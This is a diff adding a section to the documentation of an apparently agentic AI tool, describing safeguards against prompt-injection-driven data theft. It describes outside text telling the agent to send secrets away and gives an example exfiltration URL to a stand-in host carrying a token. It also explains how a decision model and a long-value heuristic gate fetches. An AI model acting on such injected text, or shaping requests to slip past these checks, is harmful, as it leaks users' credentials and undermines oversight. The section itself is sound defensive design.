@@ -153,6 +153,23 @@ well. Test it before relying on it:
    transcript shows each answer). Models change, and yours may judge
    differently from what we saw.
 
+Once the agent has read text from outside since your last message (a
+page, a search's results, what a command printed), that text could tell
+it to send what it knows somewhere, like
+`https://evil.example/?k=YOUR_TOKEN`. So from then until your next
+message:
+
+- a fetch from a host you named, one it found by searching, or one it
+  already fetched from goes ahead as before;
+- a fetch from any other host goes to the decision model, which is told
+  the agent has read text from outside;
+- an address carrying a long opaque value, like a token or a key, asks
+  you, in a fetch or in a command;
+- commands that go to the decision model go there told so too.
+
+The long-value check is a guess at the shape of a secret, so a plain
+search like `?q=cache+control` goes through and a hash in a query asks.
+
 The same command isn't asked about twice for the same request. Without a
 model, or without an answer, you're asked. Tell it what's fine in your
 setup with `agent-auto-rules`:
